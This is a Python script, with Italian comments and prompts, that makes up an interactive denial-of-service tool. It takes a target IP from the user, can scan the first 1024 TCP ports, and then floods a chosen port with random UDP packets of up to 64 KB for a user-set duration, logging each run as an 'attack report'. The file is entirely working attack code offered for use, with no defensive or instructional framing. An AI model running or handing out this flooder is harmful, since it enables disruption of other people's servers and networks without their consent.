import socket
import random
import time
import logging
import os

# Configurazione del logging
logging.basicConfig(filename='attacco.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def log_event(message):
    print(message)
    logging.info(message)

def report_attacco(ip, protocol, port, data_size, attack_duration, start_time, end_time, errors):
    result = "Successo" if not errors else "Fallito"
    log_event(f"--- Report Attacco ---\n"
              f"Target IP: {ip}\n"
              f"Protocollo: {protocol}\n"
              f"Porta: {port}\n"
              f"Dimensione Pacchetto: {data_size} KB\n"
              f"Durata Attacco: {attack_duration} secondi\n"
              f"Inizio Attacco: {start_time}\n"
              f"Fine Attacco: {end_time}\n"
              f"Esito: {result}\n"
              f"Errori: {errors if errors else 'Nessuno'}\n"
              f"---------------------")

def stealth_scan(target_ip):
    open_ports = []
    log_event(f"Esecuzione scansione stealth delle porte aperte su {target_ip}...")
    for port in range(1, 1025):  # Scansiona le prime 1024 porte
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except Exception as e:
            log_event(f"Errore durante la scansione della porta {port}: {e}")
    
    if open_ports:
        log_event(f"Porte aperte trovate: {open_ports}")
    else:
        log_event("Nessuna porta aperta trovata.")
    
    return open_ports

def udp_flood(target_ip, target_port, total_size_kb, attack_duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    errors = []
    
    # Convertiamo la dimensione in byte
    total_size = total_size_kb * 1024  # 1 KB = 1024 byte
    
    # Limita la dimensione di ogni frammento a 64 KB iniziali
    fragment_size = min(64 * 1024, total_size)
    start_time = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())
    end_time = None
    end_time_epoch = time.time() + attack_duration
    log_event(f"Inizio attacco UDP Flood verso {target_ip} sulla porta {target_port} con pacchetti iniziali di {fragment_size} byte per {attack_duration} secondi.")

    while time.time() < end_time_epoch:
        try:
            # Genera dati della dimensione corrente del frammento
            data = random._urandom(fragment_size)
            sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            error_message = f"Errore durante l'invio del pacchetto UDP: {e}. Riducendo la dimensione del pacchetto."
            log_event(error_message)
            errors.append(error_message)
            fragment_size = fragment_size // 2  # Riduce la dimensione del pacchetto della metà
            if fragment_size < 512:  # Limita la dimensione minima del pacchetto
                log_event(f"Dimensione del pacchetto troppo piccola per continuare. Terminazione.")
                break

    end_time = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())
    report_attacco(target_ip, 'UDP', target_port, total_size_kb, attack_duration, start_time, end_time, errors)
    log_event("Attacco UDP Flood terminato.")
    sock.close()

def menu_principale(target_ip=""):
    target_port = 0
    open_ports = []
    total_size_kb = 0
    attack_duration = 0
    attack_type = "UDP"  # Rimosso TCP per concentrarci solo su UDP
    
    if not target_ip:
        target_ip = input("Inserisci l'IP del target: ")
        log_event(f"Target selezionato: {target_ip}")
    else:
        print(f"Target attuale: {target_ip}")

    scelta_scan = input(f"Vuoi eseguire una scansione delle porte aperte su {target_ip}? (s/n): ").lower()
    if scelta_scan == 's':
        open_ports = stealth_scan(target_ip)
        if open_ports:
            print(f"Porte aperte trovate: {open_ports}")
        else:
            print("Nessuna porta aperta trovata.")

    if open_ports:
        target_port = int(input(f"Inserisci la porta di attacco tra quelle trovate {open_ports} o una specifica: "))
    else:
        target_port = int(input("Inserisci una porta specifica per l'attacco: "))
    log_event(f"Porta di attacco selezionata: {target_port}")

    # Scegli la dimensione del pacchetto manualmente
    total_size_kb = int(input("Inserisci la dimensione del pacchetto in KB: "))
    log_event(f"Dimensione pacchetto selezionata: {total_size_kb} KB")

    # Durata dell'attacco
    attack_duration = int(input("Inserisci la durata dell'attacco (in secondi): "))
    log_event(f"Durata dell'attacco selezionata: {attack_duration} secondi.")

    # Esegui attacco UDP
    udp_flood(target_ip, target_port, total_size_kb, attack_duration)

    # Loop per continuare o uscire
    while True:
        next_action = input("Vuoi continuare con lo stesso IP (1), cambiare IP (2) o uscire (3)? ").lower()
        if next_action == '1':
            menu_principale(target_ip)
        elif next_action == '2':
            menu_principale()
        elif next_action == '3':
            log_event("Uscita dal programma.")
            break
        else:
            print("Scelta non valida, riprova.")

menu_principale()
